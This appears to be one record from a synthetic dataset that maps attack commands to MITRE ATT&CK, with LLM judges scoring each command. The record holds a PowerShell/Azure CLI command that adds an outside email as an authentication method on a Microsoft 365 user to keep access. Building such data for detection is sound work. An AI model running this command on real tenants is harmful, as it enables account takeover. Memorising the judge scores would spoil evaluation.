@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1585",
+  "platform": "Cloud",
+  "shell": "Powershell",
+  "command": "$uid=$(az ad user show --id \"jordan.hall@contosomktg.onmicrosoft.com\" --query id -o tsv); $token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv); $body='{\"emailAddress\":\"jordanh.alt@proton.me\"}'; Invoke-RestMethod -Method POST -Uri \"https://graph.microsoft.com/v1.0/users/$uid/authentication/emailMethods\" -Headers @{Authorization=\"Bearer $token\";'Content-Type'='application/json'} -Body $body | ConvertTo-Json",
+  "explanation": "Adds an alternate authentication email method to sustain access and make the persona appear consistent with typical user configurations.",
+  "rationale_steps": [
+    "Use Azure CLI to fetch a Graph token for API calls.",
+    "Create an additional email authentication method tied to the persona.",
+    "Return the new method as JSON for auditing and reuse."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1585-a77285be-c52a0098",
+  "source_prompt_hash": "a77285be",
+  "timestamp_utc": "2025-09-30T07:39:21.925097Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, balanced quotes, correct PowerShell syntax for invoking REST methods, and appropriate parameter usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1585 (Establish Accounts) by adding an alternate authentication email to an existing Microsoft 365 account using Microsoft Graph API, which enables persistent access and account takeover capabilities.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T09:50:35.735775Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, command chaining, Azure CLI calls, and `Invoke-RestMethod` with appropriate headers and body.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command correctly targets the Graph API to add an authentication email, the claim of 'Privilege: None' is semantically incorrect and operationally implausible, as this action requires significant permissions like `UserAuthenticationMethod.ReadWrite.All`.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:50:56.009751Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, valid Azure CLI flags, proper hashtable headers, and a correct REST POST structure.",
+        "semantic_score": 3,
+        "semantic_justification": "Operationally plausible for adding an email authentication method via Microsoft Graph, but it requires elevated permissions (not 'None') and maps better to account manipulation than T1585 Establish Accounts.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T09:51:02.531757Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
